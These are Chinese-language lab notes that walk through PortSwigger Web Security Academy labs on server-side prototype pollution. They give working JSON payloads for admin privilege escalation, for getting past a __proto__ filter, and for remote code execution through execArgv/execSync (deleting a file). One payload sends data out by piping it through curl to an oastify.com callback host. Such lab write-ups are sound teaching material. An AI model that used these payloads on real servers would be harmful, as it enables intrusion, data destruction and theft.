## 通过污染属性反射检测服务器端原型污染

通过服务器端原型污染实现权限提升
https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution


按照示例，尝试寻找POST方法可能对应的响应JSON表单
POST /my-account/change-address HTTP/2

```json
{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"2TvgEgcgUIByfEXAe5qerCiVRdI7p5qV"}
```
响应为
```json
{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":false}
```


修改为识别污染源
```json
{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"2TvgEgcgUIByfEXAe5qerCiVRdI7p5qV","__proto__":{
        "foo":"bar"
    }}
```
响应回显了修改
```json
{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":false,"foo":"bar"}
```

尝试直接修改为 "isAdmin":true
返回仍未 false

修改为原型污染
```json
{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"2TvgEgcgUIByfEXAe5qerCiVRdI7p5qV","__proto__":{
        "isAdmin":true
    }}
```
此时返回 "isAdmin":true

## 绕过输入过滤器以进行服务器端原型污染
实验：绕过有缺陷的输入过滤器以实现服务器端原型污染 | Web 安全学院
https://portswigger.net/web-security/prototype-pollution/server-side/lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution

提交表单的请求为
POST /my-account/change-address HTTP/2
在JSON中加入 构造函数原型污染字段，以绕过对__proto__的过滤
使用 json spaces 检测污染
```json
{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"7NsUIlotUJj5EmMIW0hucjvATzsTWPtS",
    "constructor":{
        "prototype":{
            "json spaces": 6
        }           
    }
}
```
污染成功
在原型污染中修改为
"isAdmin": true


## 通过服务器端原型污染实现远程代码执行
实验：通过服务器端原型污染实现远程代码执行
https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution

添加原型污染测试
POST /my-account/change-address HTTP/2
管理员的清理功能可触发子进程生成
POST /admin/jobs HTTP/2

```json
"__proto__":{
    "json spaces":5,
    "shell":"node",
    "NODE_OPTIONS":"--inspect=ki66fy6nzxir325onc9nu2xcz35utohd.oastify.com\"\".oastify\"\".com"
}
```
控制服务器收到查询

构建攻击向量，添加到原型污染中
```json
"execArgv": [
    "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
]
```


实验：通过服务器端原型污染窃取敏感数据
https://portswigger.net/web-security/prototype-pollution/server-side/lab-exfiltrating-sensitive-data-via-server-side-prototype-pollution

构建攻击向量，添加到原型污染中
```json
"__proto__":{
    "shell":"vim",
    "input":":! echo \"test\" | curl -d @- ki66fy6nzxir325onc9nu2xcz35utohd.oastify.com\n"
}
```
控制服务器得到post主体为 test 字符串

"__proto__":{
